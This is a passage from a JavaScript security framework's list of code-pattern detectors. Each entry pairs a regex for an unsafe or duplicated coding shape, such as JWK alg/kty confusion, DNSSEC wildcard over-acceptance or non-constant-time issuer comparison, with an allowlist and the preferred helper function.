    primitive: "ABSENT_PARAM_OIDS.has(oid) ? writeNode(SEQUENCE, writeOid(oid)) : writeNode(SEQUENCE, [writeOid(oid), writeNull()])",
    regex: /writeOid\(\s*["']2\.16\.840\.1\.101\.3\.4\.(?:3\.(?:17|18|19|31)|4\.[23])["']\s*\)[\s\S]{0,160}?writeNull\s*\(\s*\)/,
    allowlist: [],
    reason: "Codex flagged cms-codec.js emitting `_algorithmIdentifier(OID.mldsaXX)` with an unconditional NULL parameter. RFC 9909 / 9881 / 9936 specify absent parameters for these OIDs. Any new emitter for PQC OIDs MUST split on the absent-params set — see cms-codec.js's ABSENT_PARAM_OIDS.",
  },
  {
    // Codex P1 (v0.10.13 PR #102) — ASN.1 context-specific implicit
    // tag bytes (0x80 | N for primitive, 0xa0 | N for constructed)
    // hand-rolled at call sites instead of routed through the
    // dedicated helpers. The bug class: an SKI wrap that should be
    // [0] IMPLICIT OCTET STRING (primitive, 0x80) emitted as
    // constructed (0xa0) because the developer wrote `0xa0 | 0`
    // by hand and didn't think about the CHOICE alternative's
    // primitive-vs-constructed distinction. cms-codec.js provides
    // `_writeImplicitPrimitive` + `_writeImplicitConstructed`;
    // callers pick by intent and the tag byte is built inside the
    // helper, not at the call site.
    id: "hand-rolled-context-specific-implicit-tag",
    primitive: "_writeImplicitPrimitive(N, value)  OR  _writeImplicitConstructed(N, payload)",
    regex: /\b(?:tagByte|tag)\s*=\s*0x(?:80|a0)\s*\|\s*\(?\s*\w+\s*&\s*0x1f\s*\)?/,
    allowlist: [
      // Helpers + asn1-der live here; their internal use of the bit
      // pattern is the source-of-truth implementation.
      "lib/cms-codec.js",
      "lib/asn1-der.js",
    ],
    reason: "Codex flagged cms-codec.js _writeImplicit wrapping a SubjectKeyIdentifier in [0] CONSTRUCTED instead of [0] PRIMITIVE — strict CMS parsers reject the structure. New ASN.1 encoders MUST use the named helpers (_writeImplicitPrimitive / _writeImplicitConstructed) rather than hand-rolling the tag byte, so the primitive-vs-constructed distinction is forced by call-site naming.",
  },
  {
    // Codex P2 (v0.10.0) — RFC byte-cap checks measured via JS string
    // `.length` (UTF-16 code units) for fields the RFC defines as
    // octet-based. Inputs containing non-ASCII characters silently
    // bypass the cap; downstream storage / wire-protocol layers can
    // then receive payloads longer than the advertised byte limit.
    // ManageSieve §2.1 script-name was the bug class: 256 emoji
    // characters = 256 UTF-16 code units but 1024 UTF-8 bytes,
    // sneaking past a 512-byte cap. Use `Buffer.byteLength(s, "utf8")`
    // for any cap labeled "bytes" or matched to an RFC octet limit.
    id: "utf16-length-as-byte-cap",
    primitive: "Buffer.byteLength(name, \"utf8\") > capInBytes",
    regex: /\b(?:name|input|s|str)\.length\s*>\s*\w*(?:maxBytes|MaxBytes|ByteCap|byteCap|maxScriptNameBytes|maxValueBytes|maxLineBytes|maxHeaderBytes)\b/,
    allowlist: [
      // ASCII-only field domains where length === byteLength holds by
      // construction (verb tokens, IP literals, base64 alphabets,
      // hex-digit checks, RFC 5321 LDH-domain labels).
      "lib/safe-buffer.js",
      "lib/safe-url.js",
      "lib/parsers/safe-ini.js",
      "lib/parsers/safe-toml.js",
      // guard-html / guard-svg: pre-existing — the maxBytes check
      // intentionally caps the JS-string size (post-coercion at the
      // primitive's entry boundary). Sanitizer runs UTF-16-aware
      // tokenization; multibyte excess is a downstream property of
      // the sanitizer output, not the input cap. Follow-up audit
      // tracks whether the cap should switch to Buffer.byteLength
      // for byte-accurate semantics, but the current behavior
      // matches the operator-supplied profile's intent (string
      // length, not wire-size).
      "lib/guard-html.js",
      "lib/guard-svg.js",
    ],
    reason: "Codex flagged guard-managesieve-command using .length (UTF-16 code units) for RFC 5804 §2.1's octet-based script-name cap. Non-ASCII names bypassed the byte limit. New code measuring against a *byte* cap MUST use Buffer.byteLength; .length is correct only for ASCII-only domains explicitly allowlisted above.",
  },
  {
    // CVE-2026-22817 — alg/kty confusion. Importing a JWK via
    // nodeCrypto.createPublicKey({ key: jwk, format: "jwk" }) WITHOUT
    // a preceding `_assertAlgKtyMatch(alg, jwk)` call is the
    // confused-deputy shape: an attacker-controlled `alg: "HS256"`
    // against an RSA-kty JWK has node:crypto.verify treat the public
    // key bytes as an HMAC secret. Every JWT verifier in the framework
    // (oauth.verifyIdToken / jwt-external.verify / oid4vci proof
    // verify / sd-jwt-vc.verify / openid-federation.verifyEntityStatement)
    // routes through jwtExternal._assertAlgKtyMatch.
    id: "jwk-import-without-alg-kty-check",
    primitive: "jwtExternal._assertAlgKtyMatch(alg, jwk) BEFORE createPublicKey({ key: jwk, format: 'jwk' })",
    // Trip on a JWK→key import (`createPublicKey({ key: ..., format:
    // "jwk" })`) that lives in a `_jwkToKey`-style helper WITHOUT a
    // sibling call to `_assertAlgKtyMatch` (or `jwtExternal._assertAlgKtyMatch`)
    // anywhere in the helper's enclosing function. The regex looks
    // for the JWK-import inside a function whose body never names
    // the helper — within a bounded window.
    //
    // Implementation: match the JWK-import shape. Files in the
    // allowlist below have audited helpers either (a) at the
    // import site, (b) at every caller upstream of it, or (c) at
    // a non-attacker-controlled JWK shape (sign-side / pinned-key
    // paths). New code MUST either add the call adjacent to the
    // import OR add an allowlist entry with a justification.
    regex: /createPublicKey\s*\(\s*\{\s*key:\s*\w+(?:\.\w+)?\s*,\s*format:\s*["']jwk["']/,
    allowlist: [
      // The helper lives here and exports it; verifyExternal routes
      // every JWK through _assertAlgKtyMatch BEFORE handing it to
      // _jwkToKey. The local createPublicKey call inside _jwkToKey
      // runs after the helper has gated.
      "lib/auth/jwt-external.js",
      // oauth.js — verifyIdToken calls jwtExternal._assertAlgKtyMatch
      // BEFORE _jwkToKey on every code path that resolves a JWK from
      // an attacker-supplied header.kid.
      "lib/auth/oauth.js",
      // sd-jwt-vc.js — verify() calls jwtExternal._assertAlgKtyMatch
      // before _verifyJwt on every JWK-resolved path.
      "lib/auth/sd-jwt-vc.js",
      // openid-federation.js — verifyEntityStatement calls the helper
      // BEFORE createPublicKey on every code path.
      "lib/auth/openid-federation.js",
      // oid4vci.js — _verifyProofJwt calls the helper BEFORE
      // createPublicKey on the holder JWK.
      "lib/auth/oid4vci.js",
      // dpop.js builds proofs (sign-side) using the embedded JWK; the
      // proof's alg comes from the SAME header the JWK is read from
      // and is exhaustively validated via _signParamsForAlg /
      // SUPPORTED_ALGS. The DPoP-specific verify path is special-
      // cased to the proof's own embedded jwk (not a JWKS lookup),
      // so alg-confusion can't cross signers.
      "lib/auth/dpop.js",
      // jwt.js is the PQC-only framework-signed-JWT verifier; alg is
      // fixed to ML-DSA-* and the JWK kty=AKP shape is the only
      // acceptable input.
      "lib/auth/jwt.js",
      // sd-jwt-vc-issuer.js / sd-jwt-vc-holder.js — issuer signing
      // path imports the operator-supplied private key, not an
      // attacker-controlled JWK. Verify path lives in sd-jwt-vc.js.
      "lib/auth/sd-jwt-vc-issuer.js",
      "lib/auth/sd-jwt-vc-holder.js",
      // saml.js — SAML signatures use X.509 cert paths, not JWKs.
      "lib/auth/saml.js",
      // FIDO MDS3 — operator-pinned root CA chain, JWK consumed only
      // after the chain itself is verified out-of-band.
      "lib/auth/fido-mds3.js",
      // status-list.js — minted JWS by the framework itself, JWK
      // comes from the operator's pinned key set.
      "lib/auth/status-list.js",
      // dbsc.js — verifyBindingAssertion calls
      // jwtExternal._assertAlgKtyMatch BEFORE createPublicKey on
      // the browser-supplied DBSC binding JWK.
      "lib/dbsc.js",
      // did.js — _jwkToKey allowlists the JWK's kty/crv (OKP/Ed25519 or
      // EC/P-256/P-384/secp256k1) and refuses any other type BEFORE
      // createPublicKey, which is the DID-context equivalent of the
      // alg/kty cross-check: a DID document carries verification keys,
      // not a verification alg (the consuming verifier — b.vc / b.mdoc —
      // supplies the alg allowlist), so there is no `alg` to pass to
      // _assertAlgKtyMatch; the kty/crv allowlist is the confusion guard.
      "lib/did.js",
      // cose.js — importKey maps a COSE_Key to a KeyObject after
      // allowlisting kty (OKP/EC2) + crv (Ed25519 / P-256 / P-384 /
      // P-521 — the curves b.cose.verify has an algorithm for); the JWK
      // is constructed from the COSE_Key, not
      // attacker-chosen alg-vs-kty, and b.cose.verify supplies the alg
      // allowlist separately. Same kty/crv-allowlist confusion guard as
      // did.js — there is no verification `alg` carried in a COSE_Key.
      "lib/cose.js",
      // network-dnssec.js — _dnskeyToKey constructs the JWK ITSELF from
      // the DNSSEC algorithm number (8/13/14/15, validated against the
      // ALGORITHMS table) — kty/crv are derived from that number, never
      // read from an attacker-supplied JWK. verifyRrset also refuses an
      // RRSIG whose algorithm disagrees with the DNSKEY's before the key
      // is built, so the alg→kty/crv binding is fixed at the source. The
      // confused-deputy (alg-vs-kty) shape cannot arise — there is no
      // externally-chosen kty to confuse.
      "lib/network-dnssec.js",
      // crypto.js — b.crypto.importPublicJwk is the SINGLE choke point
      // that every untrusted-JWK import now routes through (enforced by
      // the create-public-jwk-hand-rolled detector). It is a generic
      // createPublicKey({ format: "jwk" }) + typed-error translator and
      // carries NO verification alg of its own — the alg/kty cross-check
      // belongs to (and stays in) each caller's verify flow: the JWT
      // verifiers (oauth / jwt-external / oid4vci / sd-jwt-vc /
      // openid-federation / dpop) call jwtExternal._assertAlgKtyMatch
      // BEFORE handing the assembled JWK here, and the alg-less formats
      // (did / cose / network-dnssec) kty/crv-allowlist upstream. So the
      // import-site itself has nothing to cross-check — same shape as the
      // did.js / cose.js entries, centralised.
      "lib/crypto.js",
    ],
    reason: "CVE-2026-22817 — every JWT verifier that resolves a JWK BY ATTACKER-CONTROLLED HEADER (kid / x5t) must cross-check the declared alg against the JWK's kty (and crv for EC) BEFORE handing the key to node:crypto.verify. Imports that skip the check are exactly the confused-deputy shape (RS256→HS256 family). The shared helper `jwtExternal._assertAlgKtyMatch(alg, jwk)` is the single point of enforcement; new code routes through it. Allowlist entries are sign-side / pinned-cert paths where the JWK is not attacker-supplied, or (did.js) where a kty/crv allowlist stands in for alg/kty because the format carries no verification alg.",
  },
  {
    // DNSSEC denial-of-existence: a wildcard at the closest encloser in
    // an NXDOMAIN (Name Error) proof must be proven NON-EXISTENT
    // (covered). Accepting a MATCHING wildcard owner as proof lets a
    // forged NXDOMAIN suppress data that wildcard expansion should have
    // synthesised (RFC 4035 §5.4, RFC 5155 §8.4). The bug shape is a
    // boolean gate that treats "covered OR matched" as acceptable:
    // `!findCover(x) && !findMatch(x)`. The fix requires cover alone.
    id: "nsec-wildcard-cover-or-match-accepted",
    primitive: "wildcard non-existence in an NXDOMAIN proof requires findCover() alone — never `!findCover(x) && !findMatch(x)`",
    regex: /!\s*findCover\s*\([^)]*\)\s*&&\s*!\s*findMatch\s*\(/,
    allowlist: [],
    reason: "DNSSEC NXDOMAIN over-acceptance — for a Name Error proof the source-of-synthesis wildcard must be COVERED (proven absent). A matching wildcard owner means the wildcard exists and the query should have been answered by expansion, so a response claiming NXDOMAIN is forged. The `!findCover(x) && !findMatch(x)` gate accepts a matching wildcard as proof and must never appear; the correct gate is `!findCover(x)`. Detection is precise: only the cover-OR-match denial gate matches. Wildcard-NODATA (which legitimately needs a MATCHING wildcard with the type absent) uses `findMatch(...)` standalone with a type-bitmap check, not this gate, so it does not match.",
  },
  {
    // DNSSEC key selection: 16-bit key tags collide (RFC 4034 App B), so
    // selecting a SINGLE DNSKEY by tag and verifying only against it
    // yields a false `bad-signature` when a colliding non-signing key
    // appears first in the RRset. A verifier must try EVERY key whose
    // tag (and algorithm) match (RFC 4035 §5.3.1) — `_keysByTag` +
    // `_verifyRrsetWithAnyKey`, never a `_findKeyByTag`-style single pick.
    id: "dnssec-single-key-by-tag",
    primitive: "_keysByTag(...) + try-every-candidate — never a single-result _findKeyByTag for signature verification",
    regex: /_findKeyByTag\s*\(/,
    allowlist: [],
    reason: "DNSSEC key-tag collision false-negative — a 16-bit DNSKEY tag is not unique within an RRset (RFC 4034 Appendix B explicitly permits collisions). Picking the first key with a matching tag and verifying only against it rejects an otherwise-valid chain when a colliding non-signing key sorts earlier. RFC 4035 §5.3.1 requires trying every key whose tag and algorithm match until one validates; the framework does this via `_keysByTag` + `_verifyRrsetWithAnyKey`. The single-result `_findKeyByTag` helper must not be (re)introduced for signature key selection.",
  },
  {
    // Wire-enum validation against a lookup table must use an integer +
    // own-property check, never `key in TABLE` or `TABLE[key] !==
    // undefined`: `in` / member access walk the prototype chain, so an
    // attacker-supplied `"__proto__"` (or a string `"1"` that coerces on
    // lookup but then fails strict-=== comparisons) slips past. The
    // dane TLSA usage / selector / matching-type enums are validated via
    // `_enumField` (typeof number + Number.isInteger + hasOwnProperty).
    id: "dane-enum-unsafe-membership",
    primitive: "_enumField(v, TABLE, ...) — integer + Object.prototype.hasOwnProperty, never `v in TABLE` / `TABLE[v] === undefined`",
    regex: /\b(?:in\s+(?:USAGES|SELECTORS|MATCHING)\b|(?:USAGES|SELECTORS|MATCHING)\s*\[[^\]]+\]\s*===?\s*undefined)/,
    allowlist: [],
    reason: "Prototype-key / string-coercion bypass — validating an untrusted wire enum with `key in TABLE` or `TABLE[key] !== undefined` accepts inherited keys such as `__proto__` (and string keys like `\"1\"` that coerce on lookup but break later strict-=== branches). The DANE TLSA enums (certificate usage / selector / matching type) must be validated with a numeric + integer + own-property test (`_enumField`). The unsafe membership forms must not appear for these tables.",
  },
  {
    // CVE-2026-23552 — cross-realm JWT acceptance via non-CT iss
    // compare. `payload.iss !== expectedIssuer` (or claims.iss / token.iss)
    // leaks prefix-timing bytes that let an attacker narrow which
    // realm the verifier accepts. Use `jwtExternal._issuerMatches`
    // (constant-time, handles unequal-length safely).
    id: "non-ct-iss-compare",
    primitive: "jwtExternal._issuerMatches(actual, expected) — constant-time iss compare",
    regex: /(?:payload|claims|token)\.iss\s*!==\s*(?:opts\.issuer|vopts\.issuer|expectedIssuer|configuredIssuer|this\.issuer|preset\.issuer)\b/,
    allowlist: [
      // jwt-external + oauth are the helpers' canonical home + main
      // consumer; both route through _issuerMatches now. Files in
      // allowlist below are non-JWT iss comparisons (string-equality
      // on configuration values, not attacker-controlled payloads).
    ],
    reason: "CVE-2026-23552 — JWT iss comparisons against attacker-controlled payload values leak prefix-timing via `!==`. Every JWT verifier in the framework (oauth.verifyIdToken / jwt-external.verifyExternal / oauth.parseFrontchannelLogoutRequest / sd-jwt-vc.verify) routes through jwtExternal._issuerMatches for constant-time comparison. Detection is precise: `payload.iss !== ...` / `claims.iss !== ...` / `token.iss !== ...` is the JWT-verify-side shape. Non-JWT iss checks (e.g. discovery-document self-consistency where iss came from the same TLS-fetched body) are not in scope and don't match the regex.",
  },
  {
    // Alg-allowlist gate (CWE-347 improper-sig-verification /
    // CWE-757 algorithm-downgrade) — accepting unknown JOSE alg
    // values via a `switch (alg) { default: ... }` permissive
    // default-branch is the canonical shape. Verifiers MUST throw in the default
    // branch (no fall-through to a permissive "any signature"
    // path). The detector catches `switch (...alg)` (case-
    // insensitive) where the default branch returns/falls through
    // without throwing.
    id: "jose-alg-switch-permissive-default",
    primitive: "Throw in the default branch of any switch on a JOSE alg value (refuse unknown alg outright)",
    // Match `switch (alg) { ... default: return ... }` /
    // `default: break` — the specific permissive shape. Throwing
    // defaults pattern as `default:\s*throw` and are NOT matched.
    regex: /switch\s*\(\s*\w*[Aa]lg\w*\s*\)\s*\{(?:(?!\n\s{0,2}\}|\bdefault:)[\s\S]){0,6000}?default:\s*(?:return|break|\/\/[^\n]*\n\s*\})/,
    allowlist: [
      // sd-jwt-vc.js's _resolveSigAlgo DOES throw in the default
      // branch, so it doesn't match. Other auth files use
      // explicit if-cascades that throw, also not matched.
    ],
    reason: "Alg-allowlist gate (CWE-347 / CWE-757) — JWT verifiers that accept unknown alg values via a permissive switch-default branch are the canonical bypass class. Every alg-dispatch primitive in the framework throws in the default branch (`throw new AuthError('.../unsupported-alg', ...)`) so an unrecognized alg can never reach a signature-verify call. The detector specifically flags `switch (alg)` (or `switch (header.alg)` / `switch (sigAlgo)`) whose default-branch returns / breaks rather than throwing. New alg-dispatch code throws in the default — no exceptions.",
  },
  {
    id: "inline-codepoint-class-table",
    primitive: "codepointClass.BIDI_RE / C0_CTRL_RE / ZERO_WIDTH_RE / NULL_RE_G / hex4 / charClass / fromCp",
    regex: /var\s+BIDI_RANGES\s*=\s*\[\s*0x200E(?:(?!\n\})[\s\S]){0,2000}?new RegExp\(\s*["']\[["']\s*\+\s*charClass\(/,
    allowlist: ["lib/codepoint-class.js"],
    reason: "Extracted across guard-csv / guard-html / guard-svg. The BIDI_RANGES + C0_CTRL_RANGES + ZERO_WIDTH_RANGES literal tables plus the _hex4 / _charClass / _fromCp helpers plus the `new RegExp(\"[\" + _charClass(...) + \"]\")` regex compilations were identical across 3 guard primitives by design. Centralized so the codepoint catalog has a single source of truth and future guards (filename / archive / mime / ...) consume the shared module instead of re-defining the tables.",
  },
  {
    id: "inline-resolve-profile-and-posture",
    primitive: "gateContract.resolveProfileAndPosture(opts, { profiles, compliancePostures, defaults, errorClass, errCodePrefix })",
    regex: /typeof\s+opts\.profile\s*===\s*["']string["'](?:(?!\n\})[\s\S]){0,1600}?compliancePosture(?:(?!\n\})[\s\S]){0,1600}?Object\.assign\(\{\}\s*,\s*[A-Z]+/,
    allowlist: ["lib/gate-contract.js"],
    reason: "Extracted across guard-csv / guard-html / guard-svg. Every guard primitive's _resolveOpts opens with the identical `if (opts.profile) overlay = PROFILES[opts.profile]; if (opts.compliancePosture) overlay = Object.assign(overlay, COMPLIANCE_POSTURES[...]); return Object.assign({}, DEFAULTS, overlay, opts);` cascade. Centralized in gateContract so future guards consume the shared resolver — keeps the family resolution shape identical across members.",
  },
  {
    id: "inline-char-strip-policy-cascade",
    primitive: "codepointClass.applyCharStripPolicies(text, opts)",
    regex: /opts\.bidiPolicy\s*===\s*["']strip["'](?:(?!\n\})[\s\S]){0,800}?opts\.controlPolicy\s*===\s*["']strip["'](?:(?!\n\})[\s\S]){0,800}?opts\.nullBytePolicy/,
    allowlist: ["lib/codepoint-class.js"],
    reason: "Extracted across guard-html / guard-svg sanitize paths — the 4-line `if (opts.bidiPolicy === 'strip') s = s.replace(BIDI_RE_G, '')` cascade was identical. guard-csv uses different opt-name vocabulary (bidiCharPolicy / nullByteHandling) so it keeps its inline strip block; that's a single-vendor occurrence, below the duplicate-detector floor.",
  },
  {
    id: "inline-detect-char-threats",
    primitive: "codepointClass.detectCharThreats(text, opts, codePrefix)",
    regex: /var\s+bidiMatch\s*=\s*\w+\.match\(BIDI_RE\)(?:(?!\n\})[\s\S]){0,1200}?bidi-override(?:(?!\n\})[\s\S]){0,1600}?nullBytePolicy(?:(?!\n\})[\s\S]){0,1200}?null-byte/,
    allowlist: ["lib/codepoint-class.js"],
    reason: "Extracted across guard-html / guard-svg detection passes — the bidi/null-byte/control-char issue-emit cascade was identical at the head of every _detectIssues. guard-csv keeps its inline form because it uses different opt-name vocabulary (bidiCharPolicy / nullByteHandling) and additionally classifies homoglyphs as a CSV-specific threat.",
  },
  {
    id: "inline-profile-builder-forwarder",
    primitive: "gateContract.makeProfileBuilder(profiles)",
    regex: /function\s+buildProfile\s*\(opts\)\s*\{\s*return\s+gateContract\.buildProfile\(Object\.assign\(\{\}\s*,\s*opts,\s*\{[\s\S]{0,150}?resolveProfile:\s*function\s*\(name\)\s*\{\s*return\s+PROFILES\[name\]/,
    allowlist: ["lib/gate-contract.js"],
    reason: "Extracted across guard-csv / guard-html / guard-svg buildProfile(opts) wrappers — every guard exposed a 4-line passthrough that injected the per-guard PROFILES into gateContract.buildProfile's resolveProfile callback. Centralized into a closure factory.",
  },
  {
    id: "inline-compliance-posture-lookup",
    primitive: "gateContract.lookupCompliancePosture(name, postures, errorFactory, codePrefix)",
    regex: /if\s*\(!COMPLIANCE_POSTURES\[name\]\)[\s\S]{0,150}?bad-posture[\s\S]{0,200}?Object\.assign\(\{\}\s*,\s*COMPLIANCE_POSTURES\[name\]\)/,
    allowlist: ["lib/gate-contract.js"],
    reason: "Extracted across guard-csv / guard-html / guard-svg compliancePosture(name) entry points. Identical 5-line `if (!COMPLIANCE_POSTURES[name]) throw; return Object.assign({}, COMPLIANCE_POSTURES[name])` shape consolidated.",
  },
  {
    // Every command / protocol / pipeline guard whose four baseline
    // postures (hipaa / pci-dss / gdpr / soc2) all map to the bare string
    // "strict" composes the single frozen gateContract.ALL_STRICT_POSTURES
    // map instead of re-declaring the literal. The literal was byte-
    // identical across ~36 guard/safe/mail files (the POP3 / IMAP / SMTP /
    // ManageSieve command validators, mail-compose / query / sieve / move /
    // reply, the envelope + event-bus shapes, the mail-pipeline scorers,
    // the safe-* line-protocol parsers, and mail-crypto-smime) — a genuine
    // duplicate, not a shape-only coincidence — so it was extracted to a
    // shared constant in lib/gate-contract.js and the call sites rewritten
    // to `var COMPLIANCE_POSTURES = gateContract.ALL_STRICT_POSTURES`. The
    // STRONG-DUP block detector only fires at 3+ files, so a single future
    // file re-inlining the literal would slip past it; this n=1 inverse
    // detector catches the re-introduction the moment it lands. The
    // negative lookaheads exclude the content-guard overlay shape
    // (`Object.assign({}, PROFILES["strict"], { ... })`), which is a
    // genuinely per-guard posture map and is NOT centralized.
    id: "inline-all-strict-postures-map",
    primitive: "gateContract.ALL_STRICT_POSTURES — the canonical frozen strict-all posture map (hipaa/pci-dss/gdpr/soc2 → \"strict\"); compose it (`var COMPLIANCE_POSTURES = gateContract.ALL_STRICT_POSTURES`) instead of re-declaring the strict-all posture map inline",
    regex: /COMPLIANCE_POSTURES\s*=\s*Object\.freeze\(\s*\{(?=(?:(?!PROFILES|Object\.assign|COMPLIANCE_POSTURES\s*=)[\s\S]){0,400}?["']?hipaa["']?\s*:\s*["']strict["'])(?=(?:(?!PROFILES|Object\.assign|COMPLIANCE_POSTURES\s*=)[\s\S]){0,400}?["']pci-dss["']\s*:\s*["']strict["'])(?=(?:(?!PROFILES|Object\.assign|COMPLIANCE_POSTURES\s*=)[\s\S]){0,400}?["']?gdpr["']?\s*:\s*["']strict["'])(?=(?:(?!PROFILES|Object\.assign|COMPLIANCE_POSTURES\s*=)[\s\S]){0,400}?["']?soc2["']?\s*:\s*["']strict["'])(?:(?!PROFILES|Object\.assign|COMPLIANCE_POSTURES\s*=)[\s\S]){0,400}?\}\s*\)/,
    allowlist: ["lib/gate-contract.js"],
    reason: "The strict-all COMPLIANCE_POSTURES map (hipaa/pci-dss/gdpr/soc2 all → \"strict\") was a byte-identical duplicate across ~36 command/protocol/pipeline guards (guard-pop3/imap/smtp/managesieve-command, guard-mail-compose/query/sieve/move/reply, guard-list-id/list-unsubscribe, guard-event-bus-topic/payload, guard-dsn/envelope/message-id/idempotency-key/jmap/tenant-id/trace-context/saga-config/snapshot-envelope/agent-registry/posture-chain/stream-args, safe-ical/vcard/sieve/icap/dns, mail-helo/scan/rbl/greylist/spam-score, ai-content-detect's posture overlay, and mail-crypto-smime). Extracted to the single frozen gateContract.ALL_STRICT_POSTURES and every call site rewritten to read it by reference — the object is frozen once and shared, never mutated. This inverse detector refuses any re-inlined strict-all literal outside lib/gate-contract.js (the primitive home, allowlisted); the STRONG-DUP block detector would only catch a re-introduction once it reached 3+ files, so the n=1 gate is what makes the extraction durable. Content guards that overlay per-posture byte-limits or redaction flags (CSV / HTML / JSON / XML / YAML / JWT / OAuth / template / ... use `Object.assign({}, PROFILES[\"strict\"], { ... })`) keep their own posture map and are excluded by the negative lookaheads.",
  },
  {
    // Strict dotted-quad IPv4 regex — extracted to ipUtils.IPV4_RE / isIPv4.
    // The RFC 791 per-octet alternation (`25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d`,
    // four octets) was hand-rolled in five spellings across lib/mail-greylist
    // (CIDR fingerprint), lib/mail-rbl (RFC 5782 reverse-DNS), lib/mail-helo
    // (RFC 5321 §4.1.3 address-literal), lib/guard-domain (IPv4-as-domain
    // detection), and lib/safe-schema (`.ip()` format, exported) — three of
    // them clustered as a STRONG-DUP (fp:1292d32c2ff7), the other two below
    // the 3-file threshold. Consolidated to the single ipUtils.IPV4_RE (with
    // isIPv4 + the bracketed IPV4_ADDR_LITERAL_RE for the address-literal
    // form). The anchor (`[1-9]?` low-octet branch right after the
    // `25[0-5]|2[0-4]` head) is the standalone-IPv4 shape; safe-schema's full
    // IPv6 textual regex embeds an IPv4 tail spelled `(2[0-4]|1{0,1}[0-9])
    // {0,1}[0-9]` (a `(` after the `|`, no `[1-9]?`) and is correctly NOT
    // matched, and guard-cidr's numeric octet parse (no regex) is excluded.
    id: "inline-strict-ipv4-dotted-quad-regex",
    primitive: "ipUtils.IPV4_RE / ipUtils.isIPv4(s) / ipUtils.IPV4_ADDR_LITERAL_RE — the canonical strict RFC 791 dotted-quad IPv4 validator; compose it instead of re-spelling the per-octet `25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d` alternation inline",
    regex: /25\[0-5\]\|2\[0-4\][^\n]{0,24}\[1-9\]\?/,
    allowlist: ["lib/ip-utils.js"],
    reason: "The strict dotted-quad IPv4 octet alternation was hand-rolled in five spellings — lib/mail-greylist.js / lib/mail-rbl.js / lib/mail-helo.js (`\\d`/bracketed), lib/guard-domain.js (`[0-9]`/`1[0-9]{2}`), lib/safe-schema.js (leading-repeat) — all behaviorally identical (parity-proven over a dotted-quad corpus). It is the same RFC 791 validator drifted into divergent forms, so it was consolidated to ipUtils.IPV4_RE / isIPv4 (the existing internal IP compose-point, which previously had only the LOOSE isIPv4Shape and punted the strict octet bound back to callers — the inadequate-primitive that drove the duplication). mail-helo's RFC 5321 address-literal `[1.2.3.4]` form composes ipUtils.IPV4_ADDR_LITERAL_RE (same octet bound, capture group 1 = inner). safe-schema re-exports ipUtils.IPV4_RE so its public `.IPV4_RE` is unchanged in behavior. This n=1 inverse detector refuses any re-inlined dotted-quad octet regex outside lib/ip-utils.js (allowlisted home); the STRONG-DUP block detector only fires at 3+ files, so the n=1 gate is what keeps the extraction durable. guard-cidr's numeric _parseIpv4 (octet-by-octet bound check, no regex) and safe-schema's full IPv6 textual regex (IPv4-mapped tail, different octet spelling) are genuinely different constructs and are not matched.",
  },
  {
    // Loose IPv6 hex-colon pre-filter regex — extracted to looksLikeIPv6Hex.
    // `/^[0-9a-fA-F:]+$/` (hex digits + colons) was the fast-fail before
    // ipUtils.expandIpv6Hex in lib/mail-greylist (NO length bound) and
    // lib/mail-rbl (bounded at 39). Consolidated to ipUtils.looksLikeIPv6Hex,
    // which carries the RFC 4291 §2.2 39-char bound for both callers — a
    // hex-colon string longer than 39 chars is never a valid IPv6 textual
    // form, so greylist gains rbl's bound with no outcome change (both still
    // reject the over-long string; greylist just fails faster). guard-domain's
    // bracketed-dotted `[0-9a-fA-F:.]` and safe-buffer's colonless per-group
    // `[0-9a-fA-F]{1,4}` hextet are different shapes and are not matched.
    id: "inline-loose-ipv6-hex-colon-regex",
    primitive: "ipUtils.looksLikeIPv6Hex(s) / ipUtils.IPV6_HEX_RE — the bounded loose IPv6 textual pre-filter; compose it instead of re-spelling `/^[0-9a-fA-F:]+$/` inline before expandIpv6Hex",
    regex: /\[0-9a-fA-F:\]\+/,
    allowlist: ["lib/ip-utils.js"],
    reason: "The loose IPv6 hex-colon charset regex `/^[0-9a-fA-F:]+$/` (a cheap fail-fast before the full ipUtils.expandIpv6Hex parse) was duplicated in lib/mail-greylist.js and lib/mail-rbl.js, riding inside the fp:1292d32c2ff7 mail STRONG-DUP. mail-rbl bounded it (`ip.length > 39 || !RE.test(ip)`); mail-greylist did NOT, relying on expandIpv6Hex to reject. Consolidated to ipUtils.looksLikeIPv6Hex (length <= 39 && IPV6_HEX_RE), giving greylist rbl's bound — outcome-equivalent because a hex-colon string over 39 chars has no valid IPv6 textual form (the loose charset already excludes the dotted IPv4-mapped tail). This n=1 inverse detector refuses any re-inlined hex-colon charset regex outside lib/ip-utils.js (allowlisted home). guard-domain's IPV6_BRACKET_RE (`[0-9a-fA-F:.]` with brackets + dots) and safe-buffer's IPV6_HEXTET_RE (`[0-9a-fA-F]{1,4}`, no colon) are distinct constructs and are not matched.",
  },
  {
    id: "inline-rule-pack-loader",
    primitive: "gateContract.makeRulePackLoader(errorClass, codePrefix)",
    regex: /var\s+_\w*[Rr]ulePacks?\s*=\s*\{\}[\s\S]{0,80}function\s+loadRulePack\s*\(\s*pack\s*\)\s*\{(?:(?!\n\})[\s\S]){0,1200}?validateOpts\.requireObject(?:(?!\n\})[\s\S]){0,1200}?validateOpts\.requireNonEmptyString(?:(?!\n\})[\s\S]){0,1200}?_\w*[Rr]ulePacks?\[pack\.id\]\s*=\s*pack/,
    allowlist: ["lib/gate-contract.js"],
    reason: "Extracted across guard-csv / guard-html / guard-svg loadRulePack(pack) entry. Identical scaffolding (closed-over store + validateOpts cascade + pack.id keyed insert) consolidated into a closure factory.",
  },
  {
    id: "inline-extract-bytes-as-text",
    primitive: "gateContract.extractBytesAsText(ctx)",
    regex: /var\s+bytes\s*=\s*ctx\.bytes\s*;\s*if\s*\(!bytes\)\s*return\s*\{\s*ok:\s*true,\s*action:\s*["']serve["'][\s\S]{0,40}\s*var\s+text\s*=\s*Buffer\.isBuffer\(bytes\)/,
    allowlist: ["lib/gate-contract.js"],
    reason: "Extracted across guard-csv / guard-html check(ctx) entries. The ctx.bytes → Buffer-or-string → utf8 string normalization with empty-bytes-serve early-return was identical. guard-svg keeps the inline shape because it passes bytes (Buffer) directly to validate() for SVGZ magic-byte detection.",
  },
  {
    id: "inline-build-guard-gate-forwarder",
    primitive: "gateContract.buildGuardGate(name, opts, check)",
    regex: /forensicEvidenceStore:\s*opts\.forensicEvidenceStore(?:(?!\n\s*\}|\bonAudit:)[\s\S]){0,2000}?onAudit:\s*opts\.onAudit/,
    allowlist: ["lib/gate-contract.js", "lib/guard-all.js"],
